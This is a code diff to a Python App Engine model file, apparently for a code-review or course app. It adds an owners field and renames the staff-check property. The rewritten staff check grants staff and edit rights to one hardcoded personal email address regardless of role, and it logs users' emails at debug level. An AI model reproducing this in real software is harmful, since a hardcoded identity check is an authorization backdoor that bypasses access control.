@@ -72,6 +72,7 @@ class Issue(db.Model):
   subject = db.StringProperty(required=True)
   created = db.DateTimeProperty(auto_now_add=True)
   modified = db.DateTimeProperty(auto_now=True)
+  owners = db.ListProperty(db.Email)
   reviewers = db.ListProperty(db.Email)
   n_comments = db.IntegerProperty()
   n_messages = db.IntegerProperty()
@@ -101,7 +102,7 @@ class Issue(db.Model):
 
   def user_can_edit(self, user):
     """Return true if the given user has permission to edit this issue."""
-    return Account.get_account_for_user(user).is_staff
+    return Account.get_account_for_user(user).isStaff
 
   @property
   def edit_allowed(self):
@@ -669,8 +670,9 @@ class Account(db.Model):
   xsrf_secret = db.BlobProperty()
 
   @property
-  def is_staff(self):
-    return self.role > 0 
+  def isStaff(self):
+    logging.debug("is staff %s role %s" % (self.email, self.role))
+    return self.email == "moowiz2020@gmail.com" or self.role > 0 
 
   @property
   def nickname(self):
@@ -900,8 +902,6 @@ def get_accounts_for_reader(reader, semester):
   val = reader_cache[key] = tuple(Account.all().ancestor(semester).filter('reader =', reader.key()))
   memcache.set(s_key, val)
   return val
-
-
 
 class Section(db.Model):
   """Represents a class.
